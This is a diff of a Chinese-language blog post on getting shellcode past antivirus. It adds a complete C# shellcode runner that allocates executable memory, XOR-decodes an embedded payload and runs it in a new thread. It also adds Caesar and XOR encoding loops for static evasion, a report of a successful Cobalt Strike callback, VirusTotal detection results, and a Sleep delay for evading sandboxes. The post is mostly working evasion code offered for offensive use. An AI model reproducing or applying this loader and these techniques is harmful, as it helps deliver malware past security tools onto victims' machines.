@@ -6,6 +6,8 @@ title: Shellcode Bypass AV
 
 
 
+# Shellcode Bypass AV
+
 ## 0x01.Make a shellcode runner
 
 本文用c#来完成实现shellcode runner，首先要知道如何使用c#调用windows API，C#调用win32 API一般使用P/Invoke的方法在DLL中使用win32api
@@ -99,7 +101,7 @@ IntPtr.Zero);
 
 ![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210830220839.png)
 
-## 0x02.Encoded Shellcode 
+## 0x02.Encoded Shellcode
 
 ### Caesar加密
 
@@ -113,15 +115,104 @@ byte[] encoded = new byte[buf.Length];
             }
 ```
 
-输出的生成的shellcode，此时shellcode已经被改变过了，那么再做一步解密的操作，
+输出的生成的shellcode，此时shellcode已经被改变过了，那么再做一步解密的操作
+
+```c#
+ for (int i = 0; i < buf.Length; i++)
+            {
+                buf[i] = (byte)(((uint)buf[i] - 5) & 0xFF);
+            }
+```
+
+下面再改成左移5，然后编译shellcodeRunner，火绒再次报毒meterpreter的特征
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831223458.png)
 
 ### XOR加密
 
+凯撒密码的加密方式过于简单，尝试使用XOR加密的方式加密shellcode
+
+```c#
+        byte[] encoded = new byte[buf.Length];
+        for (int i = 0; i < buf.Length; i++)
+        {
+            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
+        }
+```
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831225103.png)
+
+完整代码如下
+
+```c#
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+using System.Text;
+using System.Threading;
+
+namespace XorShellcodeRunner
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+ uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+        uint dwCreationFlags, IntPtr lpThreadId);
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
+        UInt32 dwMilliseconds);
+        static void Main(string[] args)
+        {
+            //上面是加密过的shellcode
+            byte[] buf = new byte[894] {
+0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x32, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 
+};
+
+            for (int i = 0; i < buf.Length; i++)
+           {
+            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+            }
+            int size = buf.Length;
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            Marshal.Copy(buf, 0, addr, size);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
+            IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+    
+        }
+    }
+
+}
+```
+
+Cobaltstrike 上线没有问题
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831230322.png)
+
+文件上传到VT上测试一下，18/64个给标记了，所以说简单的加密shellcode也是可以起到一定静态免杀的效果
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210831231753.png)
+
 ## 0x03.时间判断
+
+如果在程序中加入一个延时效果，是否能够绕过Av的动态检测
+
+首先加入sleep API
+
+```c
+[DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
+```
+
+Sleep 代码片段
+
+![](https://gitee.com/a4m1n/tuchuang/raw/master/pic/20210902003727.png)
 
 ## 0x04.DoNetToJscript
 
 ## 0x05.MSHTA Bypass AV
-
-
 
